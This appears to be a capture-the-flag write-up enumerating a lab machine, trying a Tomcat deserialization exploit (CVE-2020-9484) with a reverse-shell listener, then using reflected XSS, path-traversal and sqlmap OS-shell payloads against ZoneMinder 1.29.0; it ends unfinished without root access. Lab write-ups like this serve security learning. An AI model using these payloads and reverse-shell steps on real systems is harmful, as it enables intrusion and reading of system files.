Checking the FTP service running on port `21` we currently don't have permissions to connect via anonymous access also no reliable exploit out there

Checking port 80/HTTP we have this login page, also viewing page source doesn't seem to give any reliable information


![](https://i.imgur.com/PbqwyR5.png)

Checking the port 3305/HTTP we do have a default apache2 web page, seems cool we could run directory bruteforce on this one :P, anyways page-source doesn't contain juicy information also.

Running directory bruteforce with `ffuf` looks like we have nothing really to show there

Checking port 8080/HTTP we do have a tomcat service running on version `9.0`

Reading [this](https://github.com/PenTestical/CVE-2020-9484) i was made to understand there is RCE on this version known as `CVE-2020-9484`, let go ahead and see if we can exploit this


Firstly, you need to download and setup `ysoserial`


```bash
cd /opt

sudo git clone https://github.com/frohoff/ysoserial

sudo wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-master.jar
```


Then install the script


```bash
git clone https://github.com/PenTestical/CVE-2020-9484 && cd CVE-2020-9484/ ; sudo chmod +x CVE-2020-9484.sh

./CVE-2020-9484.sh --help
```


Then Open the script and replace the IP address as line `13`, with the attacker IP for the reverse shell to work



![](https://i.imgur.com/1VH1YQC.png)



Start up a python server as the script generates a payload to be used in the process of executing our reverse shell


```bash
sudo python3 -m http.server 80
```


Start up your listener also


```bash
nc -nvlp 4444
```


Now run the script with the IP address of the target system you want to attack:


```
./CVE-2020-9484.sh TARGET-IP
```

Ooops, turns out not to be successful, let enumerate harder :P. Running directory bruteforce on port `80` again with a different word lists, we have a new directory called `/zm`



![](https://i.imgur.com/JoLpYkd.png)



Navigating to the directory on the webpage we have this **Zone Monitor Console** on V1.29.0



![](https://i.imgur.com/Xw2IgGC.png)




Checking for exploits i found this [blog](https://vk9-sec.com/zoneminder-1-291-30-exploitation-multiple-vulnerabilities/) in which all PoC's turned out to be successful, we will look at few though


### **XSS (Reflected)**


Payload -:

```
http://HOST/zm/index.php?view=request&request=log&task=download&key=a9fef1f4&format=texty9fke'<html><head></head><body><script>alert(1)</script></body></html>ayn2h
```


![](https://i.imgur.com/TAmkVIB.png)


### **LFI**

payload


```
http://HOST/zm/index.php?view=file&path=../../../../../../etc/passwd
```



![](https://i.imgur.com/iaUZw5P.png)



### **RCE**



Go ahead and intercept the request of the page with burp suite and save the request to a file as shown below -:


![](https://i.imgur.com/DBUEofV.png)


> Make sure to append `view=request&request=log&task=query&limit=100&minTime=5`


Then go ahead and run `sqlmap` specifying the option that we want a shell



```
‚ùØ sqlmap -r request.txt --dbms mysql --os-shell --data POST
```


Note that this will run for about 10 minutes üò≠, Patience!!!, Then you should have a shell


![](https://i.imgur.com/wxRSupR.png)



Running a ping scan we can see our target can truly communicate with us



![](https://i.imgur.com/7BlyjM7.png)

But that is it buddy, yeah that is it, nothing works from here, i have followed walkthroughs for walkthroughs, Nothing works, Normally we are meant to get shell as user `root` from here...
